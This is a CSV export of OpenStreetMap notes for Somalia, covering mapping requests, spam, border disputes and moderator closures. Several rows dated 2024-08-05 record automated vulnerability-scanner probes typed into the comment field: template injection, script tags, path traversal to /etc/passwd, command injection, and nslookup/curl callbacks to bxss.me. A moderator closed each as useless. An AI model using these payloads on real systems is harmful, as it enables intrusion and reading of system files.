note_id,country_name,latitude,longitude,opened_at,closed_at,days_to_resolution,opened_by_username,opening_comment,total_comments,was_reopened,closed_by_username,closing_comment
5003166,Soomaaliya الصومال,8.4024660,48.4830060,2025-10-12 00:00:00,2025-10-12 19:13:32,0,QalasQalas,Hawa Aw Ahmed's Home,2,0,QalasQalas,This marked as residential home if you want to update inform us.
3160191,Soomaaliya الصومال,9.6986900,43.6207600,2022-05-01 00:00:00,2025-10-09 12:43:17,0,Unknown,Guriga Mohamoud Mohammed cali,7,1,Khaalis,
4965625,Soomaaliya الصومال,6.8060400,47.4210310,2025-09-17 00:00:00,2025-10-01 12:47:23,0,Unknown,solar,2,0,DressyPear4,Já mapeado
605531,Soomaaliya الصومال,2.0288261,45.3096227,2016-06-26 00:00:00,2025-09-27 16:37:29,0,mustafa omar,warta (OSM data version: 2016-06-01T10:03:02Z) #mapsme,4,0,kiiila,
1995074,Soomaaliya الصومال,9.6974362,43.6227957,2019-11-14 00:00:00,2025-09-26 22:50:00,0,Halkan ka eeg,'please add this place to maps' POI name: Nuura Business POI types: shop-gift internet_access-wlan OSM data version: 2019-10-19T16:52:54Z  #mapsme,4,1,Khaalis,
3276663,Soomaaliya الصومال,2.0315200,45.3040700,2022-07-21 00:00:00,2025-09-26 07:24:45,0,BurhanOmar,HAYAT Supermarket Zobe Branch,2,0,mascuud saciid,
2016805,Soomaaliya الصومال,9.5520200,44.0642665,2019-12-04 00:00:00,2025-09-25 10:00:26,0,fan's tacaz,'call me' POI has no name POI types: amenity-telephone OSM data version: 2019-06-21T10:47:15Z  #mapsme,3,1,Qodaal,
1997087,Soomaaliya الصومال,2.0272565,45.3350133,2019-11-16 00:00:00,2025-09-23 15:54:53,0,Unknown,Wht do u wnt?,2,0,Taya_S,Spam
4832766,Soomaaliya الصومال,2.0277479,45.3299466,2025-06-30 00:00:00,2025-09-23 15:54:39,0,Unknown,People are active here. Yn ain't playing around fr fr iykyk. Mob ties OVO ting yaheard meh,2,0,Taya_S,Spam
4829160,Soomaaliya الصومال,8.4568364,47.3589706,2025-06-28 00:00:00,2025-09-23 15:54:24,0,Unknown,"This area (Laascaanood and surrounding Sool region) is currently marked as part of Somaliland. However, since August 2023, it has been under the control of the Khaatumo Administration, recognized by the Federal Government of Somalia as a Federal Member State. Please update the boundary to reflect this. Sources: https://en.goobjoog.com/federal-govt-formally-recognises-ssc-khatumo-as-6th-federal-member-state/, https://mogadishu24.com/somali-prime-minister-declares-ssc-khaatumo-a-federal-member-state/",2,0,Taya_S,Please discuss this on the forum instead
2200310,Soomaaliya الصومال,3.2072998,45.7689559,2020-05-21 00:00:00,2025-09-23 15:53:47,0,Unknown,"CEEL,BARAF SOMALIA",2,0,Taya_S,Already mapped
4889603,Soomaaliya الصومال,3.2673500,45.6998600,2025-08-03 00:00:00,2025-09-23 15:53:38,0,Unknown,Qoryaale,2,0,Taya_S,Already mapped
4930353,Soomaaliya الصومال,10.0388379,49.0477753,2025-08-26 00:00:00,2025-09-23 15:53:20,0,Gordian12,"This border is incorrect. Somaliland is not internationally recognized as a separate country by the UN, African Union, or any major international body. The official map of Somalia has 18 administrative regions only. Please remove this artificial country boundary or reflect the correct administrative divisions of Somalia (18 regions).",2,0,Taya_S,Please discuss this on the forum instead
4971082,Soomaaliya الصومال,9.5337938,45.5203579,2025-09-20 00:00:00,2025-09-20 22:44:41,0,Unknown,Jajwbebrbfvfvhr to chat in with for the day 🙌 I g am 4 namaste I 🙏 I g I am going to be a problem for  Isqabo 😭 😭 namaste 🙏 I am going for members namaste 🙏 namaste I 🙏 I g I am going to be in a meeting with you ❤️ namaste I am not in the evening today is for you and I will call u b namaste I am in the evening today is for you and I will call u b namaste I am in the world 🌎 😉 ❤️ 😊 💙 😀 🌎 😉 I am not sure able I you do that for me and I will be in the evening and you are free and I you call be later in topic-based the and I you call u 📞 ❤️,2,0,NeisReview,The content of this note is #nonsense.
4971084,Soomaaliya الصومال,9.5304425,45.5249238,2025-09-20 00:00:00,2025-09-20 22:44:28,0,Unknown,Hwhb2jy6i3x46rj5ey5eu4yererdtduysiry6p3o47xs967907ef478xe7x4fhxnejgx4sn4yujy6ghcysi86 9686i 6i 62 257 94 to  59pyiujc4k5ujnxr5fuekhxi,2,0,NeisReview,The content of this note is #nonsense.
4962769,Soomaaliya الصومال,1.9223775,42.0858201,2025-09-15 00:00:00,2025-09-16 07:15:48,0,Unknown,Это 2025,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4927437,Soomaaliya الصومال,2.0546056,45.3015192,2025-08-24 00:00:00,2025-08-24 13:41:23,0,Unknown,Here we will mark and add to the district map each debtor is a valid debtor.,3,1,Ayuub moha,"The map of Deynile district is very, very wrong and I want to correct it."
4902648,Soomaaliya الصومال,2.0312881,45.3105522,2025-08-10 00:00:00,2025-08-23 08:17:59,0,MursalAdan@1943,Naciim Electronics Km4  Home of Technology Hub,3,0,Naciim Electronics km4,
2152467,Soomaaliya الصومال,9.2885997,48.5475531,2020-04-08 00:00:00,2025-08-23 02:04:34,0,Mubka,'accident position' POI has no name POI types: amenity-bench OSM data version: 2019-10-19T16:52:54Z  #mapsme,3,1,Hassan Ahmad hassn,
2130534,Soomaaliya الصومال,2.0441498,45.3358018,2020-03-26 00:00:00,2025-08-21 11:20:27,0,Aqoon dirsad School,AQOON DIRSAD SCHOOL,8,1,dhagey55,
922314,Soomaaliya الصومال,8.3936587,48.4832958,2017-03-10 00:00:00,2025-08-21 10:15:32,0,Don_Adem,Jidka 30-ka (OSM data version: 2016-12-14T16:41:03Z) #mapsme,4,1,Abdirisak,
1384418,Soomaaliya الصومال,9.4101278,45.0630390,2018-05-06 00:00:00,2025-08-11 19:39:12,0,Khwarizmi Mohamed,'Oodweyne' POI name: Barwaaqo POI types: place-suburb OSM data version: 2018-03-16T17:06:02Z  #mapsme,2,0,Mateusz Konieczny,https://www.openstreetmap.org/note/1420144#map=15/9.41013/45.06304&layers=N
4889569,Soomaaliya الصومال,3.5663600,45.6545400,2025-08-03 00:00:00,2025-08-03 16:22:18,0,Unknown,siibooy,2,0,NeisReview,The content of this note is #nonsense.
4889596,Soomaaliya الصومال,3.5975400,45.6753200,2025-08-03 00:00:00,2025-08-03 16:22:02,0,Unknown,Afcad,2,0,NeisReview,The content of this note is #nonsense.
4880547,Soomaaliya الصومال,1.9955030,45.2712040,2025-07-28 00:00:00,2025-07-29 06:13:18,0,user_23137293,TURKSOM Military School,4,1,NeisReview,
275843,Soomaaliya الصومال,2.0377487,45.3454256,2014-11-25 00:00:00,2025-07-13 10:36:48,0,rickjdavies,"This section is called 'Via Gabradahar' in a map 'Mogadishu, Pearl of the Indian Ocean' published in the 1970s. See pdf copy here: http://tobiashagmann.freeflux.net/files/media/horn/docs/m-sh-ali-giiumale_nd_mogadishu.pdf",3,1,xamze,
275847,Soomaaliya الصومال,2.0391319,45.3419495,2014-11-25 00:00:00,2025-07-13 10:31:30,0,rickjdavies,"This point is called 'PIazza Solidarieta Africana' in a map 'Mogadishu, Pearl of the Indian Ocean' published in the 1970s. See pdf copy here: http://tobiashagmann.freeflux.net/files/media/horn/docs/m-sh-ali-giiumale_nd_mogadishu.pdf",4,0,xamze,
3168354,Soomaaliya الصومال,2.0342237,45.3427102,2022-05-06 00:00:00,2025-07-13 10:30:58,0,Unknown,onosm.org submitted note from a business: name: Lama Hamar Café phone: +252619105454 website:  twitter:  facebook:  email: lamaxamarcoffee@gmail.com hours:  category: Cafeteria address:,4,1,xamze,
275851,Soomaaliya الصومال,2.0403327,45.3455865,2014-11-25 00:00:00,2025-07-12 06:37:18,0,rickjdavies,"This section is called 'Via Hargeisa' in a map 'Mogadishu, Pearl of the Indian Ocean' published in the 1970s. See pdf copy here: http://tobiashagmann.freeflux.net/files/media/horn/docs/m-sh-ali-giiumale_nd_mogadishu.pdf",2,0,xamze,
2757507,Soomaaliya الصومال,2.0407147,45.3499880,2021-07-16 00:00:00,2025-07-12 06:37:02,0,UNGSC-cronoser,checkpoint?,4,1,xamze,taalaada
921442,Soomaaliya الصومال,8.4067636,48.4834429,2017-03-10 00:00:00,2025-07-07 20:41:25,0,Don_Adem,Masjid Jaamaca (OSM data version: 2016-12-14T16:41:03Z) #mapsme,3,0,Mateusz Konieczny,https://www.openstreetmap.org/note/922317#map=15/8.40676/48.48344&layers=N
2061401,Soomaaliya الصومال,10.0587700,44.1298400,2020-01-18 00:00:00,2025-07-05 15:53:13,0,Unknown,Gacan gem,4,1,Eng Hussein Bookh,
3341358,Soomaaliya الصومال,9.5545502,45.5524921,2022-09-01 00:00:00,2025-07-03 22:01:31,0,Ahmed jama,HECO Solar power Station,2,0,DressyPear4,Added
818502,Soomaaliya الصومال,7.0115208,47.1250832,2016-12-16 00:00:00,2025-06-22 21:59:27,0,Adensed,Malable well (OSM data version: 2016-11-23T15:14:03Z) #mapsme,2,0,GEELE12,
4786541,Soomaaliya الصومال,3.4173591,45.4069021,2025-06-02 00:00:00,2025-06-02 09:35:56,0,Shaw Caano,"Corrected the place type for Shaw. It was previously tagged as a village (place=village), but Shaw is officially recognized as a district within the Hiiraan region of Somalia. Updated the place tag to district and added relevant administrative tags.",2,0,Shaw Caano,
1077356,Soomaaliya الصومال,9.5619945,44.0533133,2017-07-24 00:00:00,2025-05-31 07:52:15,0,Mahad Mohammed,"'they were moved from here' The place has gone or never existed. This is an auto-generated note from MAPS.ME application: a user reports a POI that is visible on a map (which can be outdated), but cannot be found on the ground. POI name: Planning Ministry POI types: office-government OSM data version: 2017-06-09T16:24:09Z  #mapsme",2,0,Som migration Solutions,
1665999,Soomaaliya الصومال,2.0175590,45.2981973,2019-01-30 00:00:00,2025-04-14 08:05:46,0,Unknown,pepe,3,1,Ramla ALI,
4670631,Soomaaliya الصومال,8.3851700,45.9292749,2025-03-18 00:00:00,2025-03-18 23:53:48,0,Mxmed7271,Xorfada ballidhiid,2,0,Mxmed7271,
4650146,Soomaaliya الصومال,2.3200850,45.3734170,2025-03-03 00:00:00,2025-03-04 09:22:09,0,ECHMOS,sdsdsdsd,4,1,mavl,This note does not contain a useful information for OpenStreetMap.
4636070,Soomaaliya الصومال,2.0037058,45.2803391,2025-02-21 00:00:00,2025-02-21 15:13:19,0,Unknown,onosm.org submitted note from a business: Name: Medina Beach Resort  addr:housenumber=1000 addr:street=Jazeera Road addr:place=Medina Beach Resort  addr:city=Mogadishu addr:postcode=00100 Phone number: 252 771721953 Website: medinabeachresort.com Opening Hours: 24/7 Wheelchair accessibility: limited Category: Resorts Accepted payment methods:  takeaway=yes,2,0,Mohamed4736,Can you please verify our Location for new business
4600298,Soomaaliya الصومال,10.9422030,50.2312088,2025-01-24 00:00:00,2025-01-24 16:05:24,0,dcals70som,Turmasaale,2,0,dcals70som,
4596575,Soomaaliya الصومال,6.2690775,48.6900079,2025-01-21 00:00:00,2025-01-21 15:06:16,0,Unknown,'Bali dacare' POI name: Bali dacare POI types: waterway-waterfall OSM data version: 2024-10-09T17:32:19Z  #mapsme,2,0,NeisBot,"This note has the identical location and text  as note https://osm.org/note/4596574  Therefore, it will be closed.  #DuplicateNote"
1340011,Soomaaliya الصومال,9.5585300,44.0368200,2018-03-27 00:00:00,2025-01-21 11:57:43,0,Unknown,Diiwaanka Sakada (Zaka Registry),2,0,Mustaphe Abdi,
1340014,Soomaaliya الصومال,9.5580500,44.0411400,2018-03-27 00:00:00,2025-01-21 11:57:30,0,Unknown,State House settlements,7,1,Mustaphe Abdi,
2057757,Soomaaliya الصومال,9.5591600,44.0511600,2020-01-15 00:00:00,2025-01-21 11:57:07,0,Hargeysaawi,"Marodijeh Region Headquarter, The ministry of internal Affairs also shifted to another place. Thank you.",2,0,Mustaphe Abdi,
3318857,Soomaaliya الصومال,9.5806901,44.0595880,2022-08-17 00:00:00,2025-01-21 11:54:51,0,Shibiin yare,'waa company caano caalamka hiig sanaya' POI name: Caawiye Tracking And Logistics GPS(GEO) POI types: office-company OSM data version: 2021-05-24T07:43:34Z  #mapsme,2,0,Mustaphe Abdi,
3276640,Soomaaliya الصومال,2.0277584,45.3088644,2022-07-21 00:00:00,2024-10-27 08:24:05,0,BurhanOmar,Sahal Terminal Km4,2,0,Hal-abuur macalin,
3834365,Soomaaliya الصومال,2.0333044,45.3209907,2023-08-15 00:00:00,2024-10-10 18:15:09,0,GASHIIN TRAVEL AND TOURISM,GASHIIN TRAVEL,3,1,Xz2,
2075805,Soomaaliya الصومال,2.0426500,45.3115900,2020-02-01 00:00:00,2024-10-09 13:20:06,0,Unknown,wadada shaqaalaha,3,1,yow beyzani,
4407444,Soomaaliya الصومال,4.2413926,45.6845856,2024-08-28 00:00:00,2024-08-28 16:13:31,0,Ayieko,surface water,2,0,Ayieko,riverine
4407441,Soomaaliya الصومال,4.2310783,45.6370354,2024-08-28 00:00:00,2024-08-28 16:12:21,0,Ayieko,surface water,2,0,Ayieko,river like
4407435,Soomaaliya الصومال,0.1858982,42.7712989,2024-08-28 00:00:00,2024-08-28 16:08:34,0,Ayieko,surface water,2,0,Ayieko,This is a tributary
4407432,Soomaaliya الصومال,0.1704675,42.7456248,2024-08-28 00:00:00,2024-08-28 16:07:12,0,Ayieko,surface water,2,0,Ayieko,
4407429,Soomaaliya الصومال,0.1719615,42.7633381,2024-08-28 00:00:00,2024-08-28 16:06:37,0,Ayieko,surface water,2,0,Ayieko,
4368968,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:41:38,0,Unknown,1TP55xceEO,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368974,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:41:14,0,Unknown,response.write(9648946*9265112),2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368976,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:41:05,0,Unknown,'+response.write(9648946*9265112)+',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368978,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:40:56,0,Unknown,'+response.write(9648946*9265112)+',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368982,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:40:41,0,Unknown,notes.json,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368984,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:40:32,0,Unknown,HttP://bxss.me/t/xss.html?%00,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368985,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:40:26,0,Unknown,notes.json/.,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368987,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:40:17,0,Unknown,bxss.me/t/xss.html?%00,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368988,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:40:11,0,Unknown,01/01/1967''()&%<zzz><ScRiPt >M62t(9020)</ScRiPt>,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368990,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:40:00,0,Unknown,''()&%<zzz><ScRiPt >M62t(9802)</ScRiPt>,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368993,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:39:47,0,Unknown,01/01/19679296448,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368995,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:39:38,0,Unknown,bfg1641＜s1﹥s2ʺs3ʹhjl1641,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4368998,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:39:06,0,Unknown,<%={{={@{#{${dfb}}%>,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369001,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:38:50,0,Unknown,<th:t='${dfb}#foreach,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369003,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:38:40,0,Unknown,1}}'}}'}}1%>'%>'%><%={{={@{#{${dfb}}%>,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369006,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:38:29,0,Unknown,dfb{{98991*97996}}xca,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369008,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:38:19,0,Unknown,dfb[[${98991*97996}]]xca,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369010,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:38:08,0,Unknown,../../../../../../../../../../../../../../etc/passwd,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369011,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:38:02,0,Unknown,dfb__${98991*97996}__::.x,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369013,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:37:50,0,Unknown,../../../../../../../../../../../../../../windows/win.ini,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369014,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:37:43,0,Unknown,"'dfbzzzzzzzzbbbccccdddeeexca'.replace('z','o')",2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369016,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:37:34,0,Unknown,01/01/1967'<IAapU>,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369017,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:37:27,0,Unknown,file:///etc/passwd,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369022,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:37:08,0,Unknown,../01/01/1967,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369029,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:36:43,0,Unknown,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369035,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:36:18,0,Unknown,Http://bxss.me/t/fit.txt,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369040,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:35:58,0,Unknown,http://bxss.me/t/fit.txt?.jpg,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369043,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:35:45,0,Unknown,/etc/shells,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369046,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:35:31,0,Unknown,../../../../../../../../../../../../../../etc/shells,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369049,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:35:18,0,Unknown,c:/windows/win.ini,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369050,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:35:11,0,Unknown,bxss.me,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369052,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:59,0,Unknown,01/01/1967'&&sleep(27*1000)*rfbawv&&',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369053,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:53,0,Unknown,01/01/1967'&&sleep(27*1000)*ypehba&&',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369054,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:47,0,Unknown,01/01/1967'||sleep(27*1000)*ljafyb||',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369055,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:41,0,Unknown,01/01/1967'||sleep(27*1000)*laskxj||',2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369057,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:31,0,Unknown,echo letfrl$()\ slgxra\nz^xyu||a #' &echo letfrl$()\ slgxra\nz^xyu||a #|' &echo letfrl$()\ slgxra\nz^xyu||a #,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369058,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:24,0,Unknown,&echo hhmzfe$()\ vhkrdr\nz^xyu||a #' &echo hhmzfe$()\ vhkrdr\nz^xyu||a #|' &echo hhmzfe$()\ vhkrdr\nz^xyu||a #,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369059,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:16,0,Unknown,01/01/1967&echo nfalxe$()\ ozymbo\nz^xyu||a #' &echo nfalxe$()\ ozymbo\nz^xyu||a #|' &echo nfalxe$()\ ozymbo\nz^xyu||a #,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369060,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:10,0,Unknown,|echo knytjl$()\ awzgdk\nz^xyu||a #' |echo knytjl$()\ awzgdk\nz^xyu||a #|' |echo knytjl$()\ awzgdk\nz^xyu||a #,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369061,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:34:02,0,Unknown,01/01/1967|echo gwiuqf$()\ xnudzq\nz^xyu||a #' |echo gwiuqf$()\ xnudzq\nz^xyu||a #|' |echo gwiuqf$()\ xnudzq\nz^xyu||a #,2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369062,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:56,0,Unknown,(nslookup -q=cname hitdarpcxlowzddcd5.bxss.me||curl hitdarpcxlowzddcd5.bxss.me)),2,0,mavl,This note does not contain a useful information for OpenStreetMap.
4369063,Soomaaliya الصومال,11.2784774,49.1792840,2024-08-05 00:00:00,2024-08-06 05:33:51,0,Unknown,$(nslookup -q=cname hitnibbhogqqxecd84.bxss.me||curl hitnibbhogqqxecd84.bxss.me),2,0,mavl,This note does not contain a useful information for OpenStreetMap.
